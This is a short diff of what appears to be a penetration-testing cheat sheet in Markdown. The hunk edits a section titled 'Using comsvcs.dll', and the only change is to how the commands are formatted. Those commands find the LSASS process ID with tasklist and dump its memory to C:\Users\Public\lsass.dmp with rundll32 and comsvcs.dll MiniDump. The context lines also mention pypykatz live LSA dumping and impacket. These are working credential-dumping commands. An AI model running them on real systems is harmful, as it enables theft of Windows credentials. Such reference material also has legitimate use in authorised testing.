@@ -59,9 +59,8 @@ pypykatz.exe live lsa
 
 #### Using comsvcs.dll
 ```
-tasklist /FI "IMAGENAME eq lsass.exe"
-rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass
-process ID> C:\Users\Public\lsass.dmp full 
+tasklist /FI "IMAGENAME eq lsass.exe" 
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS PROCESS ID> C:\Users\Public\lsass.dmp full
 ```
 
 #### From a Linux attacking machine using impacket.
